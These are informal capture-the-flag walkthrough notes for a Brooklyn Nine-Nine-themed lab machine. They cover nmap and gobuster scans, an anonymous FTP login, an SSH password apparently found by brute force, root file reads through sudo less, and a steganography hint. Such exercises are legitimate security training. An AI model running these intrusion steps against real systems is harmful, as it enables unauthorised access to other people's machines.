first do an nmap
	nmap -sC -sV -A 10.10.6.39
Go to webpage
	inspect element
		have you ever heard of steganography
gobuster dir -u 10.10.6.39 -w /usr/share/wordlists/dirb/big.txt 
	NMAP is done and it allows for anonymous login
		ls -la we see note_to_jake.txt
			we have one user named jake
			we get and open the file, we now see jake and amy
			lets try to ssh into jake
				we have jakes password
				22][ssh] host: 10.10.6.39   login: jake   password: 987654321
first check his priveleges
	sudo -l
		we are able to run less
			sudo /usr/bin/less /root/root.txt
We still need to find another flag though
	right click on image and do a view background image
wget image
	wget http://10.10.6.39/brooklyn99.jpg
we need a passphrase and the password above is not it
	THIS WAS A DAMN JOKE LOL
we need to ssh back in
	from here we can cd /home/
	cd to holt
	cat user.txt
